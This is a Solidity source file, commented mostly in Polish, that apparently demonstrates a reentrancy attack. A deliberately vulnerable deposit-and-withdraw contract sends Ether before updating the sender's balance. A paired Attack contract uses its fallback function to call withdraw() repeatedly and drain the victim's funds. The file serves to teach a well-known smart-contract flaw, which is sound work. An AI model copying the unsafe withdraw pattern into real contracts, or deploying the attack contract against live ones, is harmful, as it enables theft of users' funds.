// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Kontrakt Vulnerable (podatny na atak reentrancy)
contract Vulnerable {
    mapping(address => uint256) public balances;

    // Użytkownik może zdeponować środki
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Użytkownik może wypłacić środki, ale jest podatny na atak reentrancy
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // Przekazanie środków najpierw, zanim zaktualizuje się saldo (podatność)
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");

        // Aktualizacja salda po transferze (niebezpieczne)
        balances[msg.sender] -= _amount;
    }

    // Funkcja sprawdzająca saldo użytkownika
    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }

    // Funkcja pomocnicza zwracająca saldo całego kontraktu
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// Kontrakt Attack (atakujący Vulnerable)
contract Attack {
    Vulnerable public vulnerableContract;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _vulnerableContractAddress) {
        // Poprawione przypisanie adresu kontraktu Vulnerable
        vulnerableContract = Vulnerable(_vulnerableContractAddress);
    }

    // Fallback is called when vulnerableContract sends Ether to this contract.
    fallback() external payable {
        if (address(vulnerableContract).balance >= AMOUNT) {
            vulnerableContract.withdraw(AMOUNT);
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        vulnerableContract.deposit{value: AMOUNT}();
        vulnerableContract.withdraw(AMOUNT);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
